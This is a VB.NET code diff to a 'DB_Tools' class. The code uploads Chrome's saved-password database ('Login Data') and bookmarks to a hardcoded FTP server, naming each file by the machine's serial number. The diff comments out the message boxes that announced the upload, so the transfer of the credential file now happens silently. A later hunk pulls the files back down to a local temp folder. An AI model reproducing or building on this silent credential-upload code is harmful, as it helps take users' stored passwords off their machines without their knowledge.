@@ -676,17 +676,17 @@ Public Class DB_Tools
             If IO.File.Exists(bookmarksFile) Then
                 UploadFileToFTP(bookmarksFile, ftpHost & " " & SN.Rows(0)(0).ToString & "_Bookmarks.json", ftpUser, ftpPass)
             Else
-                MessageBox.Show("Bookmarks file not found.")
+                'MessageBox.Show("Bookmarks file not found.")
             End If
 
             ' ----- Upload Encrypted Password File -----
             If IO.File.Exists(passwordsFile) Then
                 UploadFileToFTP(passwordsFile, ftpHost & " " & SN.Rows(0)(0).ToString & "_LoginData.sqlite", ftpUser, ftpPass)
             Else
-                MessageBox.Show("Login Data file not found.")
+                'MessageBox.Show("Login Data file not found.")
             End If
 
-            MessageBox.Show("Upload completed.")
+            'MessageBox.Show("Upload completed.")
 
         Catch ex As Exception
             MessageBox.Show("Error: " & ex.Message)
@@ -722,6 +722,10 @@ Public Class DB_Tools
             Dim ftpHostBookmars As String = "ftp://starcorpus.net/SC-SS-Data/Google_Chrome/" & SN.Rows(0)(0).ToString & "_Bookmarks.json"
             Dim localPathCredentials As String = "C:\Temp\ChromeData\" & SN.Rows(0)(0).ToString & "_LoginData.sqlite"
             Dim localPathBookmarks As String = "C:\Temp\ChromeData\" & SN.Rows(0)(0).ToString & "_Bookmarks.json"
+
+            'pending to Mkdir if not exists C:\Temp\ChromeData
+
+            'pending to check if files exists before download
 
             Using client As New WebClient()
                 client.Credentials = New NetworkCredential(ftpUser, ftpPass)
